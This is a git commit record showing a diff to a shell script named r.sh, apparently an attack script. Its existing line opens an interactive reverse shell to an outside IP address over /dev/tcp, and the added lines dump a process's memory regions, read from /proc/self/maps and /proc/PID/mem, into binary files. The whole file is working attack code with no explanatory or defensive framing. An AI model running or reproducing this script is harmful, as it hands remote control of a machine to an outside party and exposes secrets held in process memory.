bdc1d0d1c346ca2454214410d581e9622126c27c
Octavio Gianatiempo <ogianatiempo@gmail.com>
2021-11-03 22:43:39 -0300

    Update r.sh

--- r.sh
+++ r.sh
@@ -1,2 +1,7 @@
 #!/bin/sh
+cat /proc/self/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
+while read a b; do
+    dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
+       skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="self_mem_$a.bin"
+done )
 bash -i >& /dev/tcp/3.22.15.135/13071 0>&1
